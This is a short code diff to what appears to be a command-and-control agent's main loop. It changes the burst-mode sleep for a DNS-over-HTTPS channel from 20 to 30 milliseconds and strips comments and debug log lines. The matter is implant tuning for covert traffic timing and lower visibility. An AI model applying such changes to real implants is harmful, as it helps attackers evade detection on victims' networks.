@@ -394,12 +394,9 @@ void AgentMain()
 			}
 
 			if (burst) {
-				// Burst mode: 20ms sleep for fast transfers (~50 QPS theoretical)
-				// NOTE: mySleep() takes milliseconds directly, WaitMask() expects seconds!
-				mySleep(20);
+				mySleep(30);
 				g_Connector->ResetTrafficTotals();
 			} else {
-				// 正常情况下沿用原始 sleep/jitter
 				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
 			}
 		}
@@ -584,12 +581,9 @@ void AgentMain()
 			}
 
 			if (burst) {
-				DohDebugLog("[DoH] Sleep: burst mode");
-				// NOTE: mySleep() takes milliseconds directly, WaitMask() expects seconds!
-				mySleep(20);
+				mySleep(30);
 				g_Connector->ResetTrafficTotals();
 			} else {
-				DohDebugLog("[DoH] Sleep: normal mode");
 				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
 			}
 		}
@@ -827,9 +821,7 @@ void AgentMain()
 			}
 
 			if (burst) {
-				// Burst mode: 20ms sleep for fast transfers (~50 QPS theoretical)
-				// NOTE: mySleep() takes milliseconds directly, WaitMask() expects seconds!
-				mySleep(20);
+				mySleep(30);
 				TX_RESET_TOTALS();
 			} else {
 				WaitMask(g_Agent->GetWorkingSleep(), baseSleep, jitter);
